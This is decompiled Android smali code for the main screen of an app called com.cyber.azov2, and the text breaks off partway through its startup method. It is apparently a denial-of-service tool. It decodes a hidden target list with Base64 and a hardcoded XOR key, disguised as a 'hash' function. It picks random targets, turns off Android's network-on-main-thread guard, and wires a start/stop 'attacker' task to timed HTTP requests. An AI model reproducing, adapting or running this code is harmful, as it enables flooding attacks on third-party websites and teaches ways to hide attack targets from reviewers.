.class public Lcom/cyber/azov2/MainActivity;
.super Landroidx/appcompat/app/AppCompatActivity;
.source "MainActivity.java"


# static fields
.field private static final EMPTY_STRING:Ljava/lang/String; = ""

.field private static final KEY:Ljava/lang/String; = "1234567890abcdefghijklmnopxyz"


# instance fields
.field private adapter:Lcom/cyber/azov2/TargetAdapter;

.field private final attacker:Ljava/lang/Runnable;

.field private binding:Lcom/example/guiproposal/databinding/ActivityMainBinding;

.field private bottomSheetBehavior:Lcom/google/android/material/bottomsheet/BottomSheetBehavior;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/google/android/material/bottomsheet/BottomSheetBehavior<",
            "Landroid/widget/LinearLayout;",
            ">;"
        }
    .end annotation
.end field

.field private bottomSheetBinding:Lcom/example/guiproposal/databinding/BottomSheetBinding;

.field private currentLevel:I

.field private handler:Landroid/os/Handler;

.field private list_targets:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private sites:[Ljava/lang/String;

.field private final statusChecker:Ljava/lang/Runnable;

.field private final targetProvider:Lcom/cyber/azov2/target/TargetProvider;

.field private timeElapsed:I

.field private final timerInterval:J

.field private final timerInterval2:J


# direct methods
.method static bridge synthetic -$$Nest$fgethandler(Lcom/cyber/azov2/MainActivity;)Landroid/os/Handler;
    .locals 0

    iget-object p0, p0, Lcom/cyber/azov2/MainActivity;->handler:Landroid/os/Handler;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$fgetsites(Lcom/cyber/azov2/MainActivity;)[Ljava/lang/String;
    .locals 0

    iget-object p0, p0, Lcom/cyber/azov2/MainActivity;->sites:[Ljava/lang/String;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$fgettimeElapsed(Lcom/cyber/azov2/MainActivity;)I
    .locals 0

    iget p0, p0, Lcom/cyber/azov2/MainActivity;->timeElapsed:I

    return p0
.end method

.method static bridge synthetic -$$Nest$fputtimeElapsed(Lcom/cyber/azov2/MainActivity;I)V
    .locals 0

    iput p1, p0, Lcom/cyber/azov2/MainActivity;->timeElapsed:I

    return-void
.end method

.method static bridge synthetic -$$Nest$mupdateProgressBarText(Lcom/cyber/azov2/MainActivity;)V
    .locals 0

    invoke-direct {p0}, Lcom/cyber/azov2/MainActivity;->updateProgressBarText()V

    return-void
.end method

.method public constructor <init>()V
    .locals 2

    .line 38
    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V

    .line 43
    new-instance v0, Lcom/cyber/azov2/target/DummyTargetProvider;

    invoke-direct {v0}, Lcom/cyber/azov2/target/DummyTargetProvider;-><init>()V

    iput-object v0, p0, Lcom/cyber/azov2/MainActivity;->targetProvider:Lcom/cyber/azov2/target/TargetProvider;

    const-wide/16 v0, 0x3e8

    .line 46
    iput-wide v0, p0, Lcom/cyber/azov2/MainActivity;->timerInterval:J

    const-wide/16 v0, 0x0

    .line 47
    iput-wide v0, p0, Lcom/cyber/azov2/MainActivity;->timerInterval2:J

    const/4 v0, 0x0

    .line 48
    iput v0, p0, Lcom/cyber/azov2/MainActivity;->timeElapsed:I

    const/4 v0, 0x1

    .line 49
    iput v0, p0, Lcom/cyber/azov2/MainActivity;->currentLevel:I

    .line 56
    new-instance v0, Lcom/cyber/azov2/MainActivity$1;

    invoke-direct {v0, p0}, Lcom/cyber/azov2/MainActivity$1;-><init>(Lcom/cyber/azov2/MainActivity;)V

    iput-object v0, p0, Lcom/cyber/azov2/MainActivity;->statusChecker:Ljava/lang/Runnable;

    .line 67
    new-instance v0, Lcom/cyber/azov2/MainActivity$2;

    invoke-direct {v0, p0}, Lcom/cyber/azov2/MainActivity$2;-><init>(Lcom/cyber/azov2/MainActivity;)V

    iput-object v0, p0, Lcom/cyber/azov2/MainActivity;->attacker:Ljava/lang/Runnable;

    return-void
.end method

.method private initProgressBar()V
    .locals 2

    .line 284
    iget-object v0, p0, Lcom/cyber/azov2/MainActivity;->binding:Lcom/example/guiproposal/databinding/ActivityMainBinding;

    iget-object v0, v0, Lcom/example/guiproposal/databinding/ActivityMainBinding;->progressTv:Landroid/widget/TextView;

    const-string v1, "0%"

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    return-void
.end method

.method public static readStream(Ljava/io/InputStream;)Ljava/lang/String;
    .locals 4

    .line 350
    new-instance v0, Ljava/io/BufferedReader;

    new-instance v1, Ljava/io/InputStreamReader;

    invoke-direct {v1, p0}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v0, v1}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 351
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    .line 355
    :goto_0
    :try_start_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_0

    .line 356
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_0

    .line 362
    :cond_0
    :try_start_1
    invoke-virtual {p0}, Ljava/io/InputStream;->close()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1

    :catch_0
    move-exception p0

    .line 364
    invoke-virtual {p0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    :catchall_0
    move-exception v0

    goto :goto_2

    :catch_1
    move-exception v0

    .line 359
    :try_start_2
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 362
    :try_start_3
    invoke-virtual {p0}, Ljava/io/InputStream;->close()V
    :try_end_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_0

    .line 367
    :goto_1
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    return-object p0

    .line 362
    :goto_2
    :try_start_4
    invoke-virtual {p0}, Ljava/io/InputStream;->close()V
    :try_end_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_2

    goto :goto_3

    :catch_2
    move-exception p0

    .line 364
    invoke-virtual {p0}, Ljava/io/IOException;->printStackTrace()V

    .line 366
    :goto_3
    throw v0
.end method

.method private setupClickListeners()V
    .locals 0

    .line 196
    invoke-direct {p0}, Lcom/cyber/azov2/MainActivity;->setupStartStopAttackBtnClickListener()V

    return-void
.end method

.method private setupRecyclerView()V
    .locals 2

    .line 190
    iget-object v0, p0, Lcom/cyber/azov2/MainActivity;->bottomSheetBinding:Lcom/example/guiproposal/databinding/BottomSheetBinding;

    iget-object v0, v0, Lcom/example/guiproposal/databinding/BottomSheetBinding;->attackRecyclerView:Landroidx/recyclerview/widget/RecyclerView;

    new-instance v1, Landroidx/recyclerview/widget/LinearLayoutManager;

    invoke-direct {v1, p0}, Landroidx/recyclerview/widget/LinearLayoutManager;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0, v1}, Landroidx/recyclerview/widget/RecyclerView;->setLayoutManager(Landroidx/recyclerview/widget/RecyclerView$LayoutManager;)V

    .line 191
    new-instance v0, Lcom/cyber/azov2/TargetAdapter;

    iget-object v1, p0, Lcom/cyber/azov2/MainActivity;->list_targets:Ljava/util/List;

    invoke-direct {v0, v1}, Lcom/cyber/azov2/TargetAdapter;-><init>(Ljava/util/List;)V

    iput-object v0, p0, Lcom/cyber/azov2/MainActivity;->adapter:Lcom/cyber/azov2/TargetAdapter;

    .line 192
    iget-object v0, p0, Lcom/cyber/azov2/MainActivity;->bottomSheetBinding:Lcom/example/guiproposal/databinding/BottomSheetBinding;

    iget-object v0, v0, Lcom/example/guiproposal/databinding/BottomSheetBinding;->attackRecyclerView:Landroidx/recyclerview/widget/RecyclerView;

    iget-object v1, p0, Lcom/cyber/azov2/MainActivity;->adapter:Lcom/cyber/azov2/TargetAdapter;

    invoke-virtual {v0, v1}, Landroidx/recyclerview/widget/RecyclerView;->setAdapter(Landroidx/recyclerview/widget/RecyclerView$Adapter;)V

    return-void
.end method

.method private setupStartStopAttackBtnClickListener()V
    .locals 2

    .line 200
    iget-object v0, p0, Lcom/cyber/azov2/MainActivity;->bottomSheetBinding:Lcom/example/guiproposal/databinding/BottomSheetBinding;

    iget-object v0, v0, Lcom/example/guiproposal/databinding/BottomSheetBinding;->startStopButton:Lcom/google/android/material/button/MaterialButton;

    .line 201
    new-instance v1, Lcom/cyber/azov2/MainActivity$$ExternalSyntheticLambda0;

    invoke-direct {v1, p0}, Lcom/cyber/azov2/MainActivity$$ExternalSyntheticLambda0;-><init>(Lcom/cyber/azov2/MainActivity;)V

    invoke-virtual {v0, v1}, Lcom/google/android/material/button/MaterialButton;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    return-void
.end method

.method private startTimer()V
    .locals 2

    .line 273
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    iput-object v0, p0, Lcom/cyber/azov2/MainActivity;->handler:Landroid/os/Handler;

    .line 274
    iget-object v0, p0, Lcom/cyber/azov2/MainActivity;->statusChecker:Ljava/lang/Runnable;

    invoke-interface {v0}, Ljava/lang/Runnable;->run()V

    .line 275
    iget-object v0, p0, Lcom/cyber/azov2/MainActivity;->attacker:Ljava/lang/Runnable;

    invoke-interface {v0}, Ljava/lang/Runnable;->run()V

    return-void
.end method

.method private stopTimer()V
    .locals 2

    .line 279
    iget-object v0, p0, Lcom/cyber/azov2/MainActivity;->handler:Landroid/os/Handler;

    iget-object v1, p0, Lcom/cyber/azov2/MainActivity;->statusChecker:Ljava/lang/Runnable;

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 280
    iget-object v0, p0, Lcom/cyber/azov2/MainActivity;->handler:Landroid/os/Handler;

    iget-object v1, p0, Lcom/cyber/azov2/MainActivity;->attacker:Ljava/lang/Runnable;

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    return-void
.end method

.method private updateLevel()V
    .locals 5

    .line 216
    iget v0, p0, Lcom/cyber/azov2/MainActivity;->currentLevel:I

    const/16 v1, 0xa

    if-ne v0, v1, :cond_0

    .line 217
    iget-object v0, p0, Lcom/cyber/azov2/MainActivity;->binding:Lcom/example/guiproposal/databinding/ActivityMainBinding;

    iget-object v0, v0, Lcom/example/guiproposal/databinding/ActivityMainBinding;->levelLabel:Landroid/widget/TextView;

    const v1, 0x7f110064

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(I)V

    goto :goto_0

    .line 219
    :cond_0
    iget-object v0, p0, Lcom/cyber/azov2/MainActivity;->binding:Lcom/example/guiproposal/databinding/ActivityMainBinding;

    iget-object v0, v0, Lcom/example/guiproposal/databinding/ActivityMainBinding;->levelLabel:Landroid/widget/TextView;

    const v1, 0x7f110040

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    iget v4, p0, Lcom/cyber/azov2/MainActivity;->currentLevel:I

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    aput-object v4, v2, v3

    invoke-virtual {p0, v1, v2}, Lcom/cyber/azov2/MainActivity;->getString(I[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 222
    :goto_0
    iget v0, p0, Lcom/cyber/azov2/MainActivity;->currentLevel:I

    const v1, 0x7f060066

    packed-switch v0, :pswitch_data_0

    .line 254
    invoke-virtual {p0, v1}, Lcom/cyber/azov2/MainActivity;->getColor(I)I

    move-result v0

    goto :goto_1

    :pswitch_0
    const v0, 0x7f060261

    .line 251
    invoke-virtual {p0, v0}, Lcom/cyber/azov2/MainActivity;->getColor(I)I

    move-result v0

    goto :goto_1

    :pswitch_1
    const v0, 0x7f060065

    .line 248
    invoke-virtual {p0, v0}, Lcom/cyber/azov2/MainActivity;->getColor(I)I

    move-result v0

    goto :goto_1

    :pswitch_2
    const v0, 0x7f060062

    .line 245
    invoke-virtual {p0, v0}, Lcom/cyber/azov2/MainActivity;->getColor(I)I

    move-result v0

    goto :goto_1

    :pswitch_3
    const v0, 0x7f060067

    .line 242
    invoke-virtual {p0, v0}, Lcom/cyber/azov2/MainActivity;->getColor(I)I

    move-result v0

    goto :goto_1

    :pswitch_4
    const v0, 0x7f060068

    .line 239
    invoke-virtual {p0, v0}, Lcom/cyber/azov2/MainActivity;->getColor(I)I

    move-result v0

    goto :goto_1

    :pswitch_5
    const v0, 0x7f060063

    .line 236
    invoke-virtual {p0, v0}, Lcom/cyber/azov2/MainActivity;->getColor(I)I

    move-result v0

    goto :goto_1

    :pswitch_6
    const v0, 0x7f060064

    .line 233
    invoke-virtual {p0, v0}, Lcom/cyber/azov2/MainActivity;->getColor(I)I

    move-result v0

    goto :goto_1

    :pswitch_7
    const v0, 0x7f06006a

    .line 230
    invoke-virtual {p0, v0}, Lcom/cyber/azov2/MainActivity;->getColor(I)I

    move-result v0

    goto :goto_1

    :pswitch_8
    const v0, 0x7f06006b

    .line 227
    invoke-virtual {p0, v0}, Lcom/cyber/azov2/MainActivity;->getColor(I)I

    move-result v0

    goto :goto_1

    .line 224
    :pswitch_9
    invoke-virtual {p0, v1}, Lcom/cyber/azov2/MainActivity;->getColor(I)I

    move-result v0

    .line 256
    :goto_1
    iget-object v1, p0, Lcom/cyber/azov2/MainActivity;->binding:Lcom/example/guiproposal/databinding/ActivityMainBinding;

    iget-object v1, v1, Lcom/example/guiproposal/databinding/ActivityMainBinding;->levelLabel:Landroid/widget/TextView;

    invoke-virtual {v1, v0}, Landroid/widget/TextView;->setTextColor(I)V

    return-void

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_9
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method

.method private updateProgressBarText()V
    .locals 3

    .line 260
    iget v0, p0, Lcom/cyber/azov2/MainActivity;->timeElapsed:I

    const/16 v1, 0x64

    if-ne v0, v1, :cond_1

    const/4 v0, 0x0

    .line 261
    iput v0, p0, Lcom/cyber/azov2/MainActivity;->timeElapsed:I

    .line 262
    iget v0, p0, Lcom/cyber/azov2/MainActivity;->currentLevel:I

    const/16 v1, 0xa

    if-ge v0, v1, :cond_0

    add-int/lit8 v0, v0, 0x1

    .line 263
    iput v0, p0, Lcom/cyber/azov2/MainActivity;->currentLevel:I

    .line 264
    invoke-direct {p0}, Lcom/cyber/azov2/MainActivity;->updateLevel()V

    .line 266
    :cond_0
    invoke-direct {p0}, Lcom/cyber/azov2/MainActivity;->initProgressBar()V

    .line 268
    :cond_1
    iget-object v0, p0, Lcom/cyber/azov2/MainActivity;->binding:Lcom/example/guiproposal/databinding/ActivityMainBinding;

    iget-object v0, v0, Lcom/example/guiproposal/databinding/ActivityMainBinding;->progressTv:Landroid/widget/TextView;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, ""

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget v2, p0, Lcom/cyber/azov2/MainActivity;->timeElapsed:I

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "%"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 269
    iget-object v0, p0, Lcom/cyber/azov2/MainActivity;->binding:Lcom/example/guiproposal/databinding/ActivityMainBinding;

    iget-object v0, v0, Lcom/example/guiproposal/databinding/ActivityMainBinding;->progressbar:Lcom/cyber/azov2/DeterminantCircularProgressBar;

    iget v1, p0, Lcom/cyber/azov2/MainActivity;->timeElapsed:I

    int-to-float v1, v1

    invoke-virtual {v0, v1}, Lcom/cyber/azov2/DeterminantCircularProgressBar;->setProgress(F)V

    return-void
.end method


# virtual methods
.method public base64_decode(Ljava/lang/String;)Ljava/lang/String;
    .locals 3

    const-string v0, ""

    const-string v1, "UTF-8"

    .line 297
    :try_start_0
    invoke-virtual {p1, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object p1
    :try_end_0
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_0 .. :try_end_0} :catch_1

    const/4 v2, 0x0

    .line 304
    invoke-static {p1, v2}, Landroid/util/Base64;->decode([BI)[B

    move-result-object p1

    .line 307
    :try_start_1
    new-instance v2, Ljava/lang/String;

    invoke-direct {v2, p1, v1}, Ljava/lang/String;-><init>([BLjava/lang/String;)V
    :try_end_1
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_1 .. :try_end_1} :catch_0

    return-object v2

    :catch_0
    move-exception p1

    .line 310
    invoke-virtual {p1}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V

    return-object v0

    :catch_1
    move-exception p1

    .line 300
    invoke-virtual {p1}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V

    return-object v0
.end method

.method public getUrlResponse(Ljava/lang/String;)Ljava/lang/String;
    .locals 3

    const-string v0, ""

    .line 319
    :try_start_0
    new-instance v1, Ljava/net/URL;

    invoke-direct {v1, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/net/MalformedURLException; {:try_start_0 .. :try_end_0} :catch_2

    .line 326
    :try_start_1
    invoke-virtual {v1}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object p1

    check-cast p1, Ljava/net/HttpURLConnection;
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    const/16 v1, 0x7d0

    .line 332
    invoke-virtual {p1, v1}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 333
    invoke-virtual {p1, v1}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 336
    :try_start_2
    new-instance v1, Ljava/io/BufferedInputStream;

    invoke-virtual {p1}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V

    .line 337
    invoke-static {v1}, Lcom/cyber/azov2/MainActivity;->readStream(Ljava/io/InputStream;)Ljava/lang/String;

    move-result-object v0
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 344
    invoke-virtual {p1}, Ljava/net/HttpURLConnection;->disconnect()V

    return-object v0

    :catchall_0
    move-exception v0

    goto :goto_0

    :catch_0
    move-exception v1

    .line 340
    :try_start_3
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 344
    invoke-virtual {p1}, Ljava/net/HttpURLConnection;->disconnect()V

    return-object v0

    :goto_0
    invoke-virtual {p1}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 345
    throw v0

    :catch_1
    move-exception p1

    .line 329
    invoke-virtual {p1}, Ljava/io/IOException;->printStackTrace()V

    return-object v0

    :catch_2
    move-exception p1

    .line 321
    invoke-virtual {p1}, Ljava/net/MalformedURLException;->printStackTrace()V

    return-object v0
.end method

.method public hash(Ljava/lang/String;)Ljava/lang/String;
    .locals 5

    .line 288
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v1, 0x0

    .line 289
    :goto_0
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v2

    if-ge v1, v2, :cond_0

    .line 290
    invoke-virtual {p1, v1}, Ljava/lang/String;->charAt(I)C

    move-result v2

    rem-int/lit8 v3, v1, 0x1d

    const-string v4, "1234567890abcdefghijklmnopxyz"

    invoke-virtual {v4, v3}, Ljava/lang/String;->charAt(I)C

    move-result v3

    xor-int/2addr v2, v3

    int-to-char v2, v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    .line 291
    :cond_0
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method

.method synthetic lambda$setupStartStopAttackBtnClickListener$0$com-cyber-azov2-MainActivity(Landroid/view/View;)V
    .locals 1

    .line 202
    iget-object p1, p0, Lcom/cyber/azov2/MainActivity;->bottomSheetBehavior:Lcom/google/android/material/bottomsheet/BottomSheetBehavior;

    invoke-virtual {p1}, Lcom/google/android/material/bottomsheet/BottomSheetBehavior;->getState()I

    move-result p1

    const/4 v0, 0x3

    if-eq p1, v0, :cond_0

    .line 203
    iget-object p1, p0, Lcom/cyber/azov2/MainActivity;->bottomSheetBehavior:Lcom/google/android/material/bottomsheet/BottomSheetBehavior;

    invoke-virtual {p1, v0}, Lcom/google/android/material/bottomsheet/BottomSheetBehavior;->setState(I)V

    .line 204
    iget-object p1, p0, Lcom/cyber/azov2/MainActivity;->bottomSheetBinding:Lcom/example/guiproposal/databinding/BottomSheetBinding;

    iget-object p1, p1, Lcom/example/guiproposal/databinding/BottomSheetBinding;->startStopButton:Lcom/google/android/material/button/MaterialButton;

    const v0, 0x7f110094

    invoke-virtual {p0, v0}, Lcom/cyber/azov2/MainActivity;->getText(I)Ljava/lang/CharSequence;

    move-result-object v0

    invoke-virtual {p1, v0}, Lcom/google/android/material/button/MaterialButton;->setText(Ljava/lang/CharSequence;)V

    .line 205
    iget-object p1, p0, Lcom/cyber/azov2/MainActivity;->adapter:Lcom/cyber/azov2/TargetAdapter;

    iget-object v0, p0, Lcom/cyber/azov2/MainActivity;->list_targets:Ljava/util/List;

    invoke-virtual {p1, v0}, Lcom/cyber/azov2/TargetAdapter;->setTargets(Ljava/util/List;)V

    .line 206
    invoke-direct {p0}, Lcom/cyber/azov2/MainActivity;->startTimer()V

    goto :goto_0

    .line 208
    :cond_0
    iget-object p1, p0, Lcom/cyber/azov2/MainActivity;->bottomSheetBehavior:Lcom/google/android/material/bottomsheet/BottomSheetBehavior;

    const/4 v0, 0x4

    invoke-virtual {p1, v0}, Lcom/google/android/material/bottomsheet/BottomSheetBehavior;->setState(I)V

    .line 209
    iget-object p1, p0, Lcom/cyber/azov2/MainActivity;->bottomSheetBinding:Lcom/example/guiproposal/databinding/BottomSheetBinding;

    iget-object p1, p1, Lcom/example/guiproposal/databinding/BottomSheetBinding;->startStopButton:Lcom/google/android/material/button/MaterialButton;

    const v0, 0x7f110092

    invoke-virtual {p0, v0}, Lcom/cyber/azov2/MainActivity;->getText(I)Ljava/lang/CharSequence;

    move-result-object v0

    invoke-virtual {p1, v0}, Lcom/google/android/material/button/MaterialButton;->setText(Ljava/lang/CharSequence;)V

    .line 210
    invoke-direct {p0}, Lcom/cyber/azov2/MainActivity;->stopTimer()V

    :goto_0
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 9

    const-string v0, "targets"

    .line 92
    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    .line 93
    new-instance p1, Landroid/os/StrictMode$ThreadPolicy$Builder;

    invoke-direct {p1}, Landroid/os/StrictMode$ThreadPolicy$Builder;-><init>()V

    invoke-virtual {p1}, Landroid/os/StrictMode$ThreadPolicy$Builder;->permitAll()Landroid/os/StrictMode$ThreadPolicy$Builder;

    move-result-object p1

    invoke-virtual {p1}, Landroid/os/StrictMode$ThreadPolicy$Builder;->build()Landroid/os/StrictMode$ThreadPolicy;

    move-result-object p1

    .line 94
    invoke-static {p1}, Landroid/os/StrictMode;->setThreadPolicy(Landroid/os/StrictMode$ThreadPolicy;)V

    const-string p1, "ShBHVUdRUkxKEls5QQwREhcbU0VEAQIdBAYZVxhUV19dW1MZSkwSTUALEBEWFFJGRRkYQAcBBB0LFFRGHUZAFBsaUUQVEhBeSkkKEUcYH0IfG01cWhEORUJADhoZWldKWxcDTQkRFUkaHEhHTgUaGwALQ1UeX1RARhhFTRscQwoXEBUVXUdGBgBCAAsIER4WFB9ARhYZFF9MTUASWExLEhEQRgQPDA0LAQFeCgxYHRBbQEFGRAIWHwwHBAUDCQlGHRxJQE8GGwQICkAeHUlfTxhaXV5RBw0NShcTRURLAh8YHR1VX1cODUYcXl1ZGEVNGxxDChcQFRVdR0YZHR9ACR0FVgsPEx4RXEFCR0sDH04QFhcRCRUNRxgeTkFMBwQMCQkLHRxGQEZbWUAeDAMRDwASRURLAh8YHR1VX1cSCFRfX11bGEVNGxxDChcQFRVdR0YYEQhDHBpSVFsSRUZDRw8ZGFVQVE8QFkZJRA8cHRoYVkJBBh4MHAhXU0saR0MVFBtYFRYTF19JSAQMBB8NQxwaUlRbEkVGQ0cPGRgJTUZPEBZGSUQPHB0aGFZCQRwdFw0IWF8dRkAUakU="

    .line 96
    invoke-virtual {p0, p1}, Lcom/cyber/azov2/MainActivity;->base64_decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 97
    invoke-virtual {p0, v1}, Lcom/cyber/azov2/MainActivity;->hash(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 100
    :try_start_0
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2, v1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_6

    .line 109
    :try_start_1
    invoke-virtual {v2, v0}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v1
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_5

    .line 117
    new-instance v2, Ljava/util/Random;

    invoke-direct {v2}, Ljava/util/Random;-><init>()V

    .line 118
    new-instance v3, Ljava/util/ArrayList;

    invoke-direct {v3}, Ljava/util/ArrayList;-><init>()V

    iput-object v3, p0, Lcom/cyber/azov2/MainActivity;->list_targets:Ljava/util/List;

    const-string v3, ""

    const/4 v4, 0x0

    move-object v6, v3

    move v5, v4

    :goto_0
    const/16 v7, 0x8

    if-ge v5, v7, :cond_1

    const/16 v7, 0xa

    .line 121
    invoke-virtual {v2, v7}, Ljava/util/Random;->nextInt(I)I

    move-result v7

    add-int/lit8 v7, v7, 0x1

    .line 124
    :try_start_2
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v7}, Lorg/json/JSONArray;->getString(I)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "\n"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7
    :try_end_2
    .catch Lorg/json/JSONException; {:try_start_2 .. :try_end_2} :catch_0

    .line 130
    iget-object v8, p0, Lcom/cyber/azov2/MainActivity;->list_targets:Ljava/util/List;

    invoke-interface {v8, v7}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_0

    add-int/lit8 v5, v5, -0x1

    goto :goto_1

    .line 136
    :cond_0
    iget-object v8, p0, Lcom/cyber/azov2/MainActivity;->list_targets:Ljava/util/List;

    invoke-interface {v8, v7}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 137
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    :goto_1
    add-int/lit8 v5, v5, 0x1

    goto :goto_0

    :catch_0
    move-exception p1

    .line 127
    invoke-virtual {p1}, Lorg/json/JSONException;->printStackTrace()V

    return-void

    :cond_1
